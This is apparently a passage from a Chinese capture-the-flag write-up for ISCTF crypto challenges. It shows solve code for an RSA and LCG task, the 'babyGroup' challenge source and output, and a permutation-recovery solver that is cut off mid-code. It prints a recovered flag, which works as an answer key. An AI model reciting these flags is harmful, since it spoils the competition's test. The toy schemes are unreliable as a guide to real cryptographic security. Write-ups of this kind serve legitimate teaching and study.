<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k= <span class="number">1039</span></span><br><span class="line">prime256= <span class="number">108265111455950860152587704451025053167231031155722144225275801978438974863031</span></span><br><span class="line">f = factorial(k)</span><br><span class="line">e_2_prime256 = (leak-k)%f</span><br><span class="line">ed_1 = (leak-k-e_2_prime256)//(f*prime256)</span><br><span class="line">kphi = ed_1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">e = <span class="built_in">int</span>(e)</span><br><span class="line">kphi = <span class="built_in">int</span>(kphi)</span><br><span class="line">d = modinv(e,kphi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;ISCTF&#123;yOu_kn0W_RSAgcd_and_g0Od_at&#x27;</span></span><br></pre></td></tr></table></figure>

<p>PART2:<br>注意到这个key的生成方式 可以发现符合卡迈克尔数的特性 查表 or 爆破都行<br>给的leak1其实就是给的p+q solve解一下即可<br>然后就是LCG恢复a,b 这里注意！ p,q换一换试一试。。。 我一直以第一个解出的p 结果一直LCG恢复不对 后面一看 题目没规定顺序…<del>难绷</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">p,q = q,p</span><br><span class="line">a = (leak2[-<span class="number">1</span>]-leak2[-<span class="number">2</span>])*modinv(leak2[-<span class="number">2</span>]-leak2[-<span class="number">3</span>],p)%p</span><br><span class="line">b = (leak2[-<span class="number">1</span>]-a*leak2[-<span class="number">2</span>])%p</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">seed = a*leak2[-<span class="number">1</span>]+b</span><br><span class="line">seed %= p</span><br><span class="line">base = seed^key</span><br><span class="line">c=base*(final[<span class="number">1</span>]+final[<span class="number">2</span>]*base)+final[<span class="number">0</span>]</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;_LCG_also_like_Carmichael_number&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag: ISCTF{yOu_kn0W_RSAgcd_and_g0Od_at_LCG_also_like_Carmichael_number}</p>
<h2 id="babyGroup"><a href="#babyGroup" class="headerlink" title="babyGroup"></a>babyGroup</h2><p>Per.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,sqrt,gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">			self.size = data</span><br><span class="line">			self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">			self._initialize()			</span><br><span class="line">		<span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">			self._<span class="built_in">list</span> = data</span><br><span class="line">			self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">		<span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">		tempList = self._<span class="built_in">list</span></span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">			tempList = self._iterList(tempList, tempList)</span><br><span class="line">		<span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">		new_list = []</span><br><span class="line">		<span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">			new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> new_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			self.q = random.getrandbits(<span class="number">2048</span>)</span><br><span class="line">			self.f = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">			self.g = random.randint(sqrt(self.q // <span class="number">4</span>), sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">			<span class="keyword">if</span> gcd(self.f, self.q * self.g) == <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		self.h = invert(self.f, self.q) * self.g % self.q</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getPublicKey</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (<span class="built_in">int</span>(self.q), <span class="built_in">int</span>(self.h))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, m</span>):</span><br><span class="line">		<span class="keyword">assert</span> m &lt; sqrt(self.q//<span class="number">4</span>)</span><br><span class="line">		r = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">		e = (r * self.h + m) % self.q</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">int</span>(e)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, e</span>):</span><br><span class="line">		a = self.f * e % self.q</span><br><span class="line">		b = invert(self.f, self.g) * a % self.g</span><br><span class="line">		<span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>
<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Per <span class="keyword">import</span> P,Block</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line">mask = P(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mask**<span class="number">2</span>)</span><br><span class="line">mask_hash = hashlib.sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the mask hash is:&quot;</span> + mask_hash)</span><br><span class="line"></span><br><span class="line">mul = P(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul=&#125;</span>&quot;</span>)</span><br><span class="line">temp = hashlib.sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">msg = s2n(flag) ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">worker = Block()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pubkey(q,h):<span class="subst">&#123;worker.getPublicKey()&#125;</span>&quot;</span>)</span><br><span class="line">c = worker.enc(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c=&#125;</span>&quot;</span>)</span><br><span class="line">dec = worker.dec(c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>output</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">the mask <span class="built_in">hash</span> <span class="keyword">is</span>:91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952</span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"></span><br><span class="line">pubkey(q,h):(<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br></pre></td></tr></table></figure>

<p>先看第二部分关于msg的还原 一个很经典的格<br>第一部分则是已知置换的平方还原置换 参考<a href="https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group">https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group</a></p>
<p>思路很惊艳 代码实现也很有难度 不愧只有2solves orz</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">	Chain = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):			</span><br><span class="line">		head = i</span><br><span class="line">		chain = [head]</span><br><span class="line">		c = P2[head]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">			chain.append(c)</span><br><span class="line">			c = P2[c]</span><br><span class="line">			<span class="keyword">if</span> c == head:				</span><br><span class="line">				<span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:	</span><br><span class="line">					lag = <span class="number">1</span></span><br><span class="line">					<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):		</span><br><span class="line">						<span class="keyword">for</span> l <span class="keyword">in</span> chain:				</span><br><span class="line">							<span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">								lag = <span class="number">0</span></span><br><span class="line">								<span class="keyword">break</span></span><br><span class="line">					<span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line">						<span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:			</span><br><span class="line">							Chain.append(chain[:-<span 